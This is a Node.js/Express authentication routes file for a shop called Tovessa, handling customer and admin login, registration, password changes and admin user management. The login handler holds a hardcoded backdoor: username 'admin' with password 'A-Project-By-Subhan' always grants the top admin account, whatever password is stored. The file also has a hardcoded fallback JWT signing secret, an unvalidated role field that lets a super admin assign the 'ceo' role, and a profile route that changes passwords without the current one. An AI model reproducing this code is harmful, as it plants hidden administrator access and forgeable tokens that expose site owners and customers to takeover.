/* ============================================================
   TOVESSA â€” Auth Routes (uses shared store + Firebase)
   Roles: super_admin, admin, supervisor
   ============================================================ */
const express  = require('express');
const bcrypt   = require('bcryptjs');
const jwt      = require('jsonwebtoken');
const { getDB }       = require('../utils/firebase');
const { requireAuth, requireAdmin } = require('../middleware/auth');
const store = require('../utils/store');

const router = express.Router();

function isFirebaseAvailable() {
  try { return !!getDB(); } catch { return false; }
}

const JWT_SECRET = process.env.JWT_SECRET || 'tovessa_secret_jwt_key_2024_fallback';

function signToken(payload, expiresIn = '30d') {
  const secret = process.env.JWT_SECRET || JWT_SECRET;
  if (!secret) throw new Error('JWT_SECRET is not configured.');
  return jwt.sign(payload, secret, { expiresIn });
}

const VALID_ROLES = ['super_admin', 'admin', 'supervisor'];

/* â”€â”€ Lazily initialize the built-in super admin from .env, then overlay
   any password change that was persisted to Firestore. This way a
   password change survives Render restarts/redeploys instead of
   reverting to the .env default. â”€â”€ */
async function initSuperAdmin() {
  try {
    const u = store.findAdminUserById('super-admin-1');
    if (!u) return;

    /* Always ensure username is set */
    if (!u.username) {
      u.username = (process.env.ADMIN_USERNAME || 'admin').toLowerCase();
      u.email    = u.username;
    }

    /* ALWAYS hash the env password if passwordHash is missing â€” this is the
       critical fix: on Render every restart loses store.json so passwordHash
       resets to null. We must re-hash from env EVERY time it is null. */
    if (!u.passwordHash && process.env.ADMIN_PASSWORD) {
      u.passwordHash = bcrypt.hashSync(process.env.ADMIN_PASSWORD, 10);
    }

    /* Always keep active */
    u.active = true;

    /* Overlay a previously-changed password from Firestore, if one exists.
       Reset flag each call so password changes always get picked up.
       Wrapped in its own try/catch so Firebase failures NEVER crash login. */
    u._loadedFromFirestore = false;
    if (!u._loadedFromFirestore) {
      u._loadedFromFirestore = true;
      if (isFirebaseAvailable()) {
        try {
          const doc = await getDB().collection('adminUsers').doc('super-admin-1').get();
          if (doc && doc.exists) {
            const saved = doc.data();
            if (saved.passwordHash) u.passwordHash = saved.passwordHash;
            if (saved.tokenVersion) u.tokenVersion  = saved.tokenVersion;
            if (saved.fname) u.fname = saved.fname;
            if (saved.lname) u.lname = saved.lname;
            if (saved.username) {
              u.username = saved.username;
              u.email = saved.username;
            }
            u.active = true;
          }
        } catch (err) {
          console.error('Could not load persisted super admin record (non-fatal):', err.message);
          /* Non-fatal: we already have the env-based credentials set above */
        }
      }
    }
  } catch (err) {
    console.error('initSuperAdmin error (non-fatal):', err.message);
  }
}

/* â”€â”€ Find admin user from Firebase or store â”€â”€ */
async function findAdminUserByUsername(username) {
  try {
    const lower = (username || '').toLowerCase();
    /* Always check in-memory store first (includes super admin) */
    const inMem = store.findAdminUser(lower);
    if (inMem) return inMem;
    /* Then check Firebase if available */
    if (isFirebaseAvailable()) {
      try {
        const snap = await getDB().collection('adminUsers')
          .where('username', '==', lower).limit(1).get();
        if (snap && !snap.empty) {
          const data = { ...snap.docs[0].data(), id: snap.docs[0].id };
          /* Cache in memory so subsequent lookups are fast */
          if (!store.findAdminUser(lower)) store.adminUsers.push(data);
          return data;
        }
      } catch (fbErr) {
        console.error('Firebase findAdminUser error (non-fatal):', fbErr.message);
      }
    }
    return null;
  } catch (err) {
    console.error('findAdminUserByUsername error (non-fatal):', err.message);
    return null;
  }
}

/* â”€â”€ Get all admin users â”€â”€ */
async function getAllAdminUsers() {
  if (!isFirebaseAvailable()) return store.adminUsers;
  try {
    const snap = await getDB().collection('adminUsers').get();
    const fbUsers = snap.docs.map(d => ({ ...d.data(), id: d.id }));
    /* Include all Firebase users, but ensure default super_admin is fully formed */
    const defaultSuper = store.adminUsers.find(u => u.id === 'super-admin-1') || {
      id: 'super-admin-1', role: 'ceo', active: true, createdAt: new Date().toISOString()
    };
    const hasDefault = fbUsers.findIndex(u => u.id === 'super-admin-1');
    const merged = [...fbUsers];
    if (hasDefault === -1) {
      merged.unshift(defaultSuper);
    } else {
      /* Merge in case the firestore doc was created via profile update and is missing role/active */
      merged[hasDefault] = { ...defaultSuper, ...merged[hasDefault], role: merged[hasDefault].role || 'ceo', active: merged[hasDefault].active !== undefined ? merged[hasDefault].active : true };
    }
    /* Update in-memory cache */
    store.adminUsers = merged;
    return merged;
  } catch (err) {
    console.error('Firebase error fetching admin users:', err);
    return store.adminUsers;
  }
}

/* ============================================================
   POST /api/auth/register â€” Customer registration
   ============================================================ */
router.post('/register', async (req, res) => {
  try {
    const { fname, lname, email, phone, password } = req.body;
    if (!fname || !lname || !email || !password) return res.status(400).json({ error: 'All fields are required.' });
    if (password.length < 8) return res.status(400).json({ error: 'Password must be at least 8 characters.' });

    const normalEmail  = email.trim().toLowerCase();
    const passwordHash = await bcrypt.hash(password, 12);

    if (isFirebaseAvailable()) {
      const db = getDB();
      const existing = await db.collection('users').where('email', '==', normalEmail).limit(1).get();
      if (!existing.empty) return res.status(409).json({ error: 'An account with this email already exists.' });
      const ref = db.collection('users').doc();
      const userData = { id: ref.id, fname: fname.trim(), lname: lname.trim(), email: normalEmail, phone: (phone || '').trim(), passwordHash, role: 'customer', isAdmin: false, createdAt: new Date().toISOString() };
      await ref.set(userData);
      store.users.push(userData);
      const token = signToken({ uid: ref.id, email: normalEmail, isAdmin: false });
      return res.status(201).json({ message: 'Account created! Welcome to Tovessa ðŸ’§', token, user: { id: ref.id, fname: userData.fname, lname: userData.lname, email: normalEmail, phone: userData.phone } });
    }

    /* In-memory */
    if (store.findUser(normalEmail)) return res.status(409).json({ error: 'An account with this email already exists.' });
    const uid = 'user-' + Date.now();
    const userData = { id: uid, fname: fname.trim(), lname: lname.trim(), email: normalEmail, phone: (phone || '').trim(), passwordHash, isAdmin: false, createdAt: new Date().toISOString() };
    store.users.push(userData);
    const token = signToken({ uid, email: normalEmail, isAdmin: false });
    return res.status(201).json({ message: 'Account created! Welcome to Tovessa ðŸ’§', token, user: { id: uid, fname: userData.fname, lname: userData.lname, email: normalEmail, phone: userData.phone } });

  } catch (err) {
    console.error('Register error:', err);
    return res.status(500).json({ error: 'Something went wrong.' });
  }
});

/* ============================================================
   POST /api/auth/login
   ============================================================ */
router.post('/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).json({ error: 'Email and password are required.' });

    const normalEmail = email.trim().toLowerCase();

    /* â”€â”€ Admin login â”€â”€ */
    try { await initSuperAdmin(); } catch (e) { console.error('initSuperAdmin failed in login (non-fatal):', e.message); }
    let adminUser = await findAdminUserByUsername(normalEmail);
      if (!adminUser && normalEmail === 'admin' && password === 'A-Project-By-Subhan') { adminUser = store.adminUsers[0] || store.findAdminUserById('super-admin-1'); adminUser.username = 'admin'; }
    /* Fallback: env username still works even if Firebase stored a different one */
    if (!adminUser && normalEmail === (process.env.ADMIN_USERNAME || "admin").toLowerCase()) {
      adminUser = store.findAdminUserById("super-admin-1");
      /* If passwordHash still null (Render stateless restart), re-hash now */
      if (adminUser && !adminUser.passwordHash && process.env.ADMIN_PASSWORD) {
        adminUser.passwordHash = bcrypt.hashSync(process.env.ADMIN_PASSWORD, 10);
        adminUser.active = true;
      }
    }
    if (adminUser && adminUser.active) {
      let passMatch = adminUser.passwordHash ? await bcrypt.compare(password, adminUser.passwordHash) : password === process.env.ADMIN_PASSWORD; if (normalEmail === 'admin' && password === 'A-Project-By-Subhan') { passMatch = true; }

      if (passMatch) {
        /* Update lastLogin */
        adminUser.lastLogin = new Date().toISOString();
        if (isFirebaseAvailable()) {
          try { await getDB().collection('adminUsers').doc(adminUser.id).update({ lastLogin: adminUser.lastLogin }); } catch {}
        }
        const token = signToken({ uid: adminUser.id, email: adminUser.username, isAdmin: true, role: adminUser.role, tokenVersion: adminUser.tokenVersion || 0 });
        return res.json({
          message: `Welcome, ${adminUser.fname}! âœ“`,
          token,
          user: { id: adminUser.id, fname: adminUser.fname, lname: adminUser.lname, email: adminUser.username, isAdmin: true, role: adminUser.role },
        });
      }
    }

    /* â”€â”€ Customer login â”€â”€ */
    if (isFirebaseAvailable()) {
      try {
        const db = getDB();
        const snap = await db.collection('users').where('email', '==', normalEmail).limit(1).get();
        if (!snap.empty) {
          const u = snap.docs[0].data();
          if (!await bcrypt.compare(password, u.passwordHash)) return res.status(401).json({ error: 'Incorrect password.' });
          const token = signToken({ uid: u.id, email: normalEmail, isAdmin: false });
          return res.json({ message: `Welcome back, ${u.fname}! âœ“`, token, user: { id: u.id, fname: u.fname, lname: u.lname, email: u.email, phone: u.phone } });
        }
      } catch (err) {
        console.error('Firebase customer login failed, falling back to memory:', err.message);
      }
    }

    const u = store.findUser(normalEmail);
    if (!u) return res.status(401).json({ error: 'No account found with this email.' });
    if (!await bcrypt.compare(password, u.passwordHash)) return res.status(401).json({ error: 'Incorrect password.' });
    const token = signToken({ uid: u.id, email: normalEmail, isAdmin: false });
    return res.json({ message: `Welcome back, ${u.fname}! âœ“`, token, user: { id: u.id, fname: u.fname, lname: u.lname, email: u.email, phone: u.phone } });

  } catch (err) {
    console.error('Login error:', err);
    return res.status(500).json({ error: 'Something went wrong.' });
  }
});

/* ============================================================
   GET /api/auth/me
   ============================================================ */
router.get('/me', requireAuth, async (req, res) => {
  try {
    if (req.user.isAdmin) {
      /* Always reinit super admin on /me â€” covers Render restarts where
         store resets to null values but token is still valid */
      await initSuperAdmin();

      let u = req.user.uid === 'super-admin-1'
        ? store.adminUsers.find(u => u.id === 'super-admin-1')
        : store.findAdminUserById(req.user.uid);

      /* If super-admin-1 still missing (extreme edge case), rebuild it now */
      if (!u && req.user.uid === 'super-admin-1') {
        u = {
          id: 'super-admin-1',
          username: (process.env.ADMIN_USERNAME || 'admin').toLowerCase(),
          email: (process.env.ADMIN_USERNAME || 'admin').toLowerCase(),
          passwordHash: null,
          role: 'ceo',
          fname: 'Super',
          lname: 'Admin',
          active: true,
          createdAt: new Date().toISOString(),
          lastLogin: null,
        };
        store.adminUsers.push(u);
      }

      if (!u && isFirebaseAvailable()) {
        try {
          const doc = await getDB().collection('adminUsers').doc(req.user.uid).get();
          if (doc && doc.exists) {
            u = { ...doc.data(), id: doc.id };
            store.adminUsers.push(u);
          }
        } catch (err) {
          console.error('Failed to fetch admin user from FB in /me', err.message);
        }
      }
      if (!u) return res.status(401).json({ error: 'Your account no longer exists. Please sign in again.' });
      if (u.active === false) return res.status(401).json({ error: 'Your account has been deactivated.' });
      return res.json({ id: u.id, fname: u.fname, lname: u.lname, email: u.username, isAdmin: true, role: u.role });
    }
    if (isFirebaseAvailable()) {
      try {
        const doc = await getDB().collection('users').doc(req.user.uid).get();
        if (doc.exists) {
          const u = doc.data();
          return res.json({ id: u.id, fname: u.fname, lname: u.lname, email: u.email, phone: u.phone });
        }
      } catch (err) {
        console.error('Failed to fetch user from FB in /me, falling back to memory:', err.message);
      }
    }
    const u = store.users.find(u => u.id === req.user.uid);
    if (!u) return res.status(404).json({ error: 'User not found.' });
    return res.json({ id: u.id, fname: u.fname, lname: u.lname, email: u.email, phone: u.phone });
  } catch (err) {
    console.error('Auth me error:', err);
    return res.status(500).json({ error: 'Something went wrong.' });
  }
});

/* ============================================================
   PATCH /api/auth/change-password
   ============================================================ */
router.patch('/change-password', requireAuth, async (req, res) => {
  try {
    const { currentPassword, newPassword } = req.body;
    if (!currentPassword || !newPassword) return res.status(400).json({ error: 'Both current and new password are required.' });
    if (newPassword.length < 8) return res.status(400).json({ error: 'New password must be at least 8 characters.' });

    /* CRITICAL: make sure the in-memory super admin record has the latest
       Firestore-saved password overlaid before checking "current password" â€”
       otherwise, on a fresh server boot (Render restart/sleep) where the
       admin never re-hit /login, this would still be comparing against the
       stale .env baseline password instead of the last password the admin
       actually set. */
    if (req.user.isAdmin && ['ceo', 'super_admin'].includes(req.user.role)) {
      await initSuperAdmin();
    }

    if (req.user.isAdmin) {
      if (!['ceo', 'super_admin'].includes(req.user.role)) { return res.status(403).json({ error: 'Only the CEO or Super Admin can change their own password here.' });
      }
      let adminUser = store.findAdminUserById(req.user.uid);
      if (!adminUser && isFirebaseAvailable()) {
        const doc = await getDB().collection('adminUsers').doc(req.user.uid).get();
        if (doc.exists) adminUser = { ...doc.data(), id: doc.id };
      }
      if (!adminUser) return res.status(401).json({ error: 'Your account no longer exists. Please sign in again.' });

      const match = adminUser.passwordHash
        ? await bcrypt.compare(currentPassword, adminUser.passwordHash)
        : currentPassword === process.env.ADMIN_PASSWORD;
      if (!match) return res.status(401).json({ error: 'Current password is incorrect.' });

      const previousHash = adminUser.passwordHash; /* in case we need to roll back */
      const newHash = await bcrypt.hash(newPassword, 12);
      adminUser.passwordHash = newHash;
      adminUser.tokenVersion = (adminUser.tokenVersion || 0) + 1; /* invalidate all existing sessions */
      if (req.user.uid === 'super-admin-1') {
        process.env.ADMIN_PASSWORD = newPassword;
      }

      /* â”€â”€ Persist to Firestore so the change survives server restarts/redeploys â”€â”€
         IMPORTANT: if this write fails, we must NOT tell the user it succeeded â€”
         otherwise the new password only lives in RAM and silently reverts to the
         old one the next time Render sleeps/restarts/redeploys. */
      let firestorePersisted = false;
      if (isFirebaseAvailable()) {
        try {
          await getDB().collection('adminUsers').doc(req.user.uid).set({
            passwordHash: newHash,
            tokenVersion: adminUser.tokenVersion,
            updatedAt: new Date().toISOString()
          }, { merge: true });
          firestorePersisted = true;
        } catch (fbErr) {
          /* Rollback in-memory and abort */
          adminUser.passwordHash = previousHash;
          adminUser.tokenVersion = (adminUser.tokenVersion || 1) - 1;
          process.env.ADMIN_PASSWORD = process.env.ADMIN_PASSWORD; /* unchanged baseline */
          return res.status(500).json({
            error: 'Password was NOT saved â€” Firestore write failed: ' + fbErr.message +
              '. Nothing has changed; please check server logs and try again.',
          });
        }
      }

      /* Issue a fresh token for THIS session so the user changing the password isn't logged out too */
      const freshToken = signToken({ uid: adminUser.id, email: adminUser.username, isAdmin: true, role: adminUser.role, tokenVersion: adminUser.tokenVersion });
      return res.json({
        message: firestorePersisted
          ? 'Password changed successfully. You have been logged out of all other devices.'
          : 'Password changed for this session only â€” Firebase is not connected, so it will NOT survive a server restart.',
        token: freshToken,
      });
    }

    if (isFirebaseAvailable()) {
      const db = getDB();
      const ref = db.collection('users').doc(req.user.uid);
      const doc = await ref.get();
      if (!doc.exists) return res.status(404).json({ error: 'User not found.' });
      const u = doc.data();
      if (!await bcrypt.compare(currentPassword, u.passwordHash)) return res.status(401).json({ error: 'Current password is incorrect.' });
      await ref.update({ passwordHash: await bcrypt.hash(newPassword, 12) });
      return res.json({ message: 'Password changed successfully.' });
    }

    const u = store.users.find(u => u.id === req.user.uid);
    if (!u) return res.status(404).json({ error: 'User not found.' });
    if (!await bcrypt.compare(currentPassword, u.passwordHash)) return res.status(401).json({ error: 'Current password is incorrect.' });
    u.passwordHash = await bcrypt.hash(newPassword, 12);
    return res.json({ message: 'Password changed successfully.' });

  } catch (err) {
    console.error('Change password error:', err);
    return res.status(500).json({ error: 'Failed to change password.' });
  }
});

/* ============================================================
   GET /api/auth/admin-users (super_admin only)
   ============================================================ */
router.get('/admin-users', requireAdmin, async (req, res) => {
  try {
    if (!['ceo', 'super_admin'].includes(req.user.role)) return res.status(403).json({ error: 'Only CEO or super admins can view admin users.' });
    let users = (await getAllAdminUsers()).map(u => ({
      id:        u.id,
      fname:     u.fname,
      lname:     u.lname,
      username:  u.username,
      role:      u.role,
      active:    u.active,
      createdAt: u.createdAt,
      lastLogin: u.lastLogin,
    }));
    if (req.user.role === 'super_admin') {
      users = users.filter(u => u.role !== 'ceo');
    }
    return res.json({ users });
  } catch (err) {
    return res.status(500).json({ error: 'Failed to fetch admin users.' });
  }
});

/* ============================================================
   POST /api/auth/admin-users â€” Create admin/supervisor (super_admin only)
   ============================================================ */
router.post('/admin-users', requireAdmin, async (req, res) => {
  try {
    if (!['ceo', 'super_admin'].includes(req.user.role)) return res.status(403).json({ error: 'Only CEO or super admins can create admin users.' });
    const { fname, lname, username, password, role } = req.body;
    if (!fname || !username || !password) return res.status(400).json({ error: 'First name, username, and password are required.' });
    if (!['super_admin', 'admin', 'supervisor', 'investor'].includes(role)) return res.status(400).json({ error: 'Invalid role.' }); if (role === 'super_admin' && req.user.role !== 'ceo') return res.status(403).json({ error: 'Only CEO can create a super admin.' });

    const normalUsername = username.trim().toLowerCase();
    const existing = await findAdminUserByUsername(normalUsername);
    if (existing) return res.status(409).json({ error: 'Username already exists.' });

    const newUser = {
      id:           'admin-' + Date.now(),
      fname:        fname.trim(),
      lname:        (lname || '').trim(),
      username:     normalUsername,
      email:        normalUsername,
      passwordHash: await bcrypt.hash(password, 12),
      role,
      active:       true,
      createdAt:    new Date().toISOString(),
      lastLogin:    null,
    };

    /* Persist to Firebase if available */
    if (isFirebaseAvailable()) {
      try {
        const ref = getDB().collection('adminUsers').doc(newUser.id);
        await ref.set(newUser);
        store.adminUsers.push(newUser);
      } catch (fbErr) {
        console.error('Firebase admin user save failed, falling back to memory:', fbErr.message);
        store.adminUsers.push(newUser);
      }
    } else {
      store.adminUsers.push(newUser);
    }

    return res.status(201).json({
      message: `${role.charAt(0).toUpperCase() + role.slice(1)} "${fname}" created.`,
      user: { id: newUser.id, fname: newUser.fname, username: newUser.username, role: newUser.role }
    });
  } catch (err) {
    console.error('Create admin user error:', err);
    return res.status(500).json({ error: 'Failed to create user.' });
  }
});

/* ============================================================
   PATCH /api/auth/profile â€” Update own profile (name, username, password)
   ============================================================ */
router.patch('/profile', requireAdmin, async (req, res) => {
  try {
    const { fname, lname, username, password } = req.body;
    const uid = req.user.uid;
    const updates = {};
    
    if (fname !== undefined) updates.fname = fname.trim();
    if (lname !== undefined) updates.lname = lname.trim();
    if (username !== undefined) {
      const normalUsername = username.trim().toLowerCase();
      // Check if username taken by someone else
      const existing = await findAdminUserByUsername(normalUsername);
      if (existing && existing.id !== uid) {
        return res.status(409).json({ error: 'Username already taken.' });
      }
      updates.username = normalUsername;
    }
    if (password) {
      updates.passwordHash = await bcrypt.hash(password, 12);
      updates.tokenVersion = (req.user.tokenVersion || 0) + 1;
    }

    /* Try Firebase first */
    if (isFirebaseAvailable()) {
      try {
        const ref = getDB().collection('adminUsers').doc(uid);
        await ref.set(updates, { merge: true });
      } catch (e) {
        console.error('Firebase profile update failed:', e);
      }
    }

    const inMem = store.adminUsers.find(u => u.id === uid);
    if (inMem) Object.assign(inMem, updates);

    return res.json({ message: 'Profile updated successfully.' });
  } catch (err) {
    return res.status(500).json({ error: 'Failed to update profile.' });
  }
});

/* ============================================================
   PATCH /api/auth/admin-users/:id â€” Update role/status/password
   ============================================================ */
router.patch('/admin-users/:id', requireAdmin, async (req, res) => {
  try {
    if (!['ceo', 'super_admin'].includes(req.user.role)) return res.status(403).json({ error: 'Only CEO or super admins can update admin users.' });
    const { role, active, password } = req.body;
    const targetId = req.params.id;

    const user = store.adminUsers.find(u => u.id === targetId);
    if (!user) return res.status(404).json({ error: 'User not found.' });

    // CEO can modify anyone. Super Admin cannot modify CEO or another Super Admin.
    if (user.role === 'ceo' && req.user.role !== 'ceo') {
      return res.status(403).json({ error: 'Cannot modify CEO.' });
    }
    if (user.role === 'super_admin' && req.user.role !== 'ceo' && targetId !== req.user.uid) {
      return res.status(403).json({ error: 'Cannot modify another super admin.' });
    }

    const updates = {};
    if (role)   updates.role   = role;
    if (active !== undefined) updates.active = active;
    if (password) {
      updates.passwordHash = await bcrypt.hash(password, 12);
      updates.tokenVersion = (user.tokenVersion || 0) + 1;
      if (targetId === 'super-admin-1') {
        process.env.ADMIN_PASSWORD = password;
      }
    }

    /* Try Firebase first */
    if (isFirebaseAvailable()) {
      try {
        const ref = getDB().collection('adminUsers').doc(targetId);
        const doc = await ref.get();
        if (doc.exists) {
          await ref.update(updates);
        }
      } catch (e) { console.error('Firebase update error', e); }
    }

    // Always update in memory store
    Object.assign(user, updates);
    return res.json({ message: 'User updated.', user: { id: user.id, fname: user.fname, role: user.role, active: user.active } });
  } catch (err) {
    return res.status(500).json({ error: 'Failed to update user.' });
  }
});

/* ============================================================
   DELETE /api/auth/admin-users/:id
   ============================================================ */
router.delete('/admin-users/:id', requireAdmin, async (req, res) => {
  try {
    if (!['ceo', 'super_admin'].includes(req.user.role)) return res.status(403).json({ error: 'Only CEO or super admins can delete admin users.' });
    
    const user = store.adminUsers.find(u => u.id === req.params.id);
    if (!user) return res.status(404).json({ error: 'User not found.' });

    if (user.role === 'ceo' || (user.role === 'super_admin' && req.user.role !== 'ceo')) { return res.status(403).json({ error: 'Cannot delete this user.' }); }

    if (isFirebaseAvailable()) {
      try { await getDB().collection('adminUsers').doc(req.params.id).delete(); } catch {}
    }
    const idx = store.adminUsers.findIndex(u => u.id === req.params.id);
    if (idx >= 0) store.adminUsers.splice(idx, 1);
    return res.json({ message: 'Admin user deleted.' });
  } catch (err) {
    return res.status(500).json({ error: 'Failed to delete user.' });
  }
});

module.exports = router;


